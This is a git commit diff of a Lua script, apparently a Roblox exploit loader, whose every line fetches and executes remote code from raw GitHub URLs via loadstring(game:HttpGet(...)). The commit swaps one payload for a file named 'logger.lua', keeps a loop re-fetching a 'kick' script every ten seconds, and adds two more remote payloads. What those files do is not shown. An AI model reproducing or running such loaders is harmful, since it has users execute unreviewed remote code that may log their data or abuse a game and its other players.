1e71058348c314a7621ca92ed3d92d24711c3fc5
nazarkus <nazarkuus@gmail.com>
2026-01-03 02:28:52 +0200

    Update BEST.lua

--- BEST.lua
+++ BEST.lua
@@ -1,8 +1,12 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/wartycoon/refs/heads/main/wartycoon.lua", true ))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/wartycoon/refs/heads/main/logger.lua", true))()
+
 local function backgroundLoop()
     while true do
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/kick/refs/heads/main/BEST2.lua", true ))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/kick/refs/heads/main/BEST2.lua", true))()
         task.wait(10)
     end
 end
 spawn(backgroundLoop)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpgAircraft/refs/heads/main/easy.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/refs/heads/main/easy.lua"))()
